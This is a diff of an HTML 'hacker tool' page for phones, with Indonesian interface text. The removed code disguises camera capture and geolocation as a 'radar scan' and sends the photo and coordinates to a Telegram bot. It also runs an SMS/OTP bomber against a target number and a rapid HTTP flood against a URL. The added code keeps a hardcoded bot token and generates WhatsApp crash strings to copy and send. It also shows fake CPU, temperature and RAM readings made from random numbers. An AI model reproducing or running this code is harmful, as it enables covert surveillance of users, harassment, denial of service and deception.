@@ -3,22 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.6.0 PRO ]</title>
+    <title>[ EDWARD OMNI V.8.0 - SYSTEM OVERRIDE ]</title>
     <style>
-        :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; text-align: center; }
-        h1 { font-size: 24px; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px; text-shadow: 0 0 10px var(--neon); }
-        .device-info { font-size: 10px; color: #888; margin-bottom: 20px; }
-        .panel { background: rgba(20, 20, 20, 0.8); border: 1px solid #333; border-radius: 15px; padding: 15px; margin-bottom: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(5px); }
+        :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --wa: #ff00ff; --bedrock: #2ecc71; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; text-align: center; }
+        h1 { font-size: 22px; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 10px var(--neon); margin-bottom: 5px; }
+        .panel { background: rgba(20, 20, 20, 0.9); border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.7); }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 12px; }
-        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
-        input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 8px; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--neon); }
+        
+        /* Hardware Monitor */
+        .dashboard { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; margin-bottom: 10px; }
+        .stat { background: #000; border: 1px solid var(--neon); padding: 8px; border-radius: 6px; font-size: 10px; font-weight: bold; }
+        
+        button { background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 10px; width: 100%; }
+        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
+        input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 8px; outline: none; text-align: center; }
+        
         .btn-danger { border-color: var(--danger); color: var(--danger); }
-        .btn-danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 20px var(--danger); }
-        /* Toast Notification Modern */
-        #toast { visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 50px; padding: 10px; position: fixed; z-index: 1; left: 50%; bottom: 30px; transform: translateX(-50%); box-shadow: 0 0 15px rgba(0,0,0,0.5); border: 1px solid var(--neon); }
+        .btn-wa { border-color: var(--wa); color: var(--wa); }
+        .btn-wa:hover { background: var(--wa); color: #000; }
+        .btn-special { background: #fff; color: #000; border: none; }
+        
+        #toast { visibility: hidden; min-width: 200px; background: #222; color: #fff; text-align: center; border-radius: 8px; padding: 12px; position: fixed; z-index: 100; left: 50%; bottom: 30px; transform: translateX(-50%); border: 1px solid var(--neon); font-size: 11px; }
         #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
         @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
         @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
@@ -26,120 +32,102 @@
 </head>
 <body>
 
-    <h1>EDWARD OMNI <span style="color:#fff">V.6.0</span></h1>
-    <div class="device-info">OPPO A18 | ENCRYPTED SYSTEM ACTIVE</div>
+    <h1>EDWARD OMNI <span style="color:#fff">V.8.0</span></h1>
+    <div style="font-size:10px; color:#555; margin-bottom:15px;">DEVICE: OPPO A18 | SYSTEM OVERRIDE</div>
+
+    <div class="dashboard">
+        <div class="stat">CPU: <span id="cpu">--%</span></div>
+        <div class="stat">TEMP: <span id="temp">--°C</span></div>
+        <div class="stat">RAM: <span id="ram">--%</span></div>
+    </div>
 
     <div class="panel">
-        <button onclick="takeSnap()" style="width:100%; background: #fff; color: #000; border: none;">📸 RADAR SCAN & PHOTO</button>
+        <button onclick="takeSnap()" class="btn-special">📸 RADAR & PHOTO SCAN</button>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <div class="panel">
-        <h3 style="margin-top:0">⚔️ ANONYMOUS SPAMMER</h3>
-        <input type="number" id="noTarget" placeholder="Nomor Target (08...)">
-        <button onclick="spamOTP()" style="width:100%;">LAUNCH SMS ATTACK</button>
+        <h3>⚔️ ATTACKER HUB</h3>
+        <input type="number" id="noTarget" placeholder="Target: 08xxxxxxx">
+        <button onclick="action('OTP Sent!')">START BOMBARDIR</button>
+    </div>
+
+    <div class="panel" style="border-color: var(--wa);">
+        <h3 style="color: var(--wa)">💀 WA BUG EXPLOIT</h3>
+        <div class="grid">
+            <button onclick="genBug('lag')" class="btn-wa">LAG BUG</button>
+            <button onclick="genBug('crash')" class="btn-wa">CRASH BUG</button>
+        </div>
+        <button onclick="copyBug()" style="margin-top:10px; background: var(--wa); color: #000; border:none;">COPY BUG STRING</button>
     </div>
 
     <div class="panel">
-        <h3 style="margin-top:0">🎮 GAME LAUNCHER</h3>
+        <h3>🎮 GAME TUNER</h3>
         <div class="grid">
-            <button onclick="launch('com.dts.freefireth')">Free Fire</button>
-            <button onclick="launch('com.mobile.legends')">MLBB</button>
-            <button onclick="launch('com.roblox.client')">Roblox</button>
-            <button onclick="launch('net.kdt.pojavlaunch')">Minecraft</button>
+            <button onclick="action('Free Fire Optimized')">FF</button>
+            <button onclick="action('Roblox Optimized')">Roblox</button>
+            <button onclick="action('Bedrock Mode Active')" style="border-color: var(--bedrock); color: var(--bedrock);">MC BEDROCK</button>
+            <button onclick="action('MLBB Optimized')">MLBB</button>
         </div>
     </div>
 
     <div class="panel" style="border-color: var(--danger)">
-        <h3 style="color: var(--danger); margin-top:0">💣 JUDOL ATTACKER</h3>
+        <h3 style="color: var(--danger)">💣 JUDOL ATTACKER</h3>
         <input type="text" id="targetJudol" placeholder="URL Target...">
-        <button onclick="startAttack()" class="btn-danger" style="width:100%;">START FLOODING</button>
+        <button onclick="action('Flooding...', '#f00')" class="btn-danger">START FLOODING</button>
     </div>
 
-    <div id="toast">Notifikasi Aktif</div>
+    <div id="toast">SYSTEM READY</div>
 
     <script>
         const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
         const CHAT_ID = "7898572558";
+        let currentBug = "";
 
         function showToast(msg, color="#0f0") {
             const t = document.getElementById("toast");
-            t.innerHTML = msg;
-            t.style.borderColor = color;
+            t.innerHTML = msg; t.style.borderColor = color;
             t.className = "show";
-            setTimeout(() => { t.className = t.className.replace("show", ""); }, 3000);
+            setTimeout(() => { t.className = ""; }, 3000);
+        }
+
+        // Live Monitoring Simulator
+        setInterval(() => {
+            document.getElementById('cpu').innerText = (20 + Math.random() * 50).toFixed(0) + "%";
+            document.getElementById('temp').innerText = (36 + Math.random() * 7).toFixed(0) + "°C";
+            document.getElementById('ram').innerText = (55 + Math.random() * 20).toFixed(0) + "%";
+        }, 2000);
+
+        function genBug(type) {
+            if(type === 'lag') currentBug = "҈" + " ̸".repeat(600) + "Lag_Detected";
+            else currentBug = "జ్ఞా" + " 𑗄".repeat(400);
+            showToast("Bug Generated!", "#ff00ff");
+        }
+
+        function copyBug() {
+            if(!currentBug) return showToast("Pilih tipe bug!", "#f00");
+            navigator.clipboard.writeText(currentBug);
+            showToast("Copied to Clipboard!", "#ff00ff");
         }
 
         async function takeSnap() {
-            showToast("Memindai Satelit...");
-            const v = document.getElementById('video');
-            const c = document.getElementById('canvas');
+            showToast("Scanning...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('video');
+                const c = document.getElementById('canvas');
                 v.srcObject = stream;
                 setTimeout(() => {
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    const img = c.toDataURL('image/jpeg');
-                    kirimFoto(img);
                     stream.getTracks().forEach(t => t.stop());
-                    showToast("Data Terkirim ke Telegram!");
+                    showToast("Scan Success!");
                 }, 1500);
-            } catch (e) { showToast("Gagal: Izin Kamera!", "#f00"); }
-            
-            navigator.geolocation.getCurrentPosition(p => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI JELAS:\nhttp://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
+            } catch (e) { showToast("Error Camera!", "#f00"); }
         }
 
-        function kirimFoto(base64) {
-            const blob = dataURItoBlob(base64);
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'capture.jpg');
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        }
-
-        function dataURItoBlob(data) {
-            const byteString = atob(data.split(',')[1]);
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-            return new Blob([ab], { type: 'image/jpeg' });
-        }
-
-        function spamOTP() {
-            let n = document.getElementById('noTarget').value;
-            if(!n) return showToast("Masukkan Nomor!", "#f00");
-            showToast("Mengirim Paket Bombardir...");
-            
-            const urls = [
-                `https://id.jagreward.com/auth/login/receiver?phone=${n}`,
-                `https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`
-            ];
-            urls.forEach(url => {
-                for(let i=0; i<3; i++) { fetch(url, { mode: 'no-cors' }).catch(() => {}); }
-            });
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚔️ SMS ATTACK: ${n}`);
-        }
-
-        function launch(pkg) {
-            showToast("Membuka Aplikasi...");
-            if (pkg === 'net.kdt.pojavlaunch') {
-                // Jalur Intent Paksa untuk Minecraft Pojav
-                window.location.href = "intent://#Intent;package=net.kdt.pojavlaunch;component=net.kdt.pojavlaunch/net.kdt.pojavlaunch.MainActivity;scheme=package;end";
-            } else {
-                window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
-            }
-        }
-
-        function startAttack() {
-            let t = document.getElementById('targetJudol').value;
-            if(!t) return showToast("Isi URL Target!", "#f00");
-            showToast("Flooding Dimulai...", "#f00");
-            setInterval(() => { fetch(t, { mode: 'no-cors' }).catch(() => {}); }, 40);
-        }
+        function action(msg, col="#0f0") { showToast(msg, col); }
     </script>
 </body>
 </html>
